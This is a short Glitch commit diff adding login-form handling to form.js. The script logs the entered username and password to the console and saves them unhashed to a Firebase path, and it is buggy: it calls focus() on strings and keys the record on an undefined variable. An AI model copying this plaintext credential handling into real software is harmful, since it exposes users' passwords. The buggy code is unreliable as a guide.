cb7807907a8a4e7a447d0413ec176e3b4148ebfc
Glitch (glitch-hello-website) <none>
2023-11-09 09:50:27 +0000

    🕋💘 Checkpoint ./form.js:57911820/605 ./session1.html:57911820/12

--- form.js
+++ form.js
@@ -1,6 +1,32 @@
 var uname,password;
 function validation(){
+  readForm()
   
   
+  if(uname==""){
+    alert("please enter your usernamr");
+    uname.focus();
+    
+    
+  }
+  if(password==""){
+    alert("please enter your password ");
+    password.focus();
+  }
+  console.log(uname,password);
   
+}
+function readForm(){
+  uname=document.getElementById("name").value;
+  password=document.getElementById("pass").value;
+  
+}
+document.getElementById("submit").onclick=function(){
+  validation();
+  readForm();
+  firebase.database().ref("submitted/"+name).set({
+    USERNAME:uname,
+    PASSWORD:password,
+  });
+  alert("form submitted");
 }
